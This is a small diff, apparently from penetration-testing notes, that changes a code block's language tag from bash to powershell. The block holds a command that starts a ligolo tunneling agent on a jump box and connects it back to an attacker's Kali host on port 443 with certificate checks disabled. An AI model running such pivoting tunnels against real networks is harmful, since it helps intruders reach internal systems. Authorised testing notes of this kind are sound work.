@@ -20,7 +20,7 @@ start
 ```
 
 on jump box:
-```bash
+```powershell
 ./ligolo-agent -connect $KALI_IP:443 -ignore-cert
 ```
 
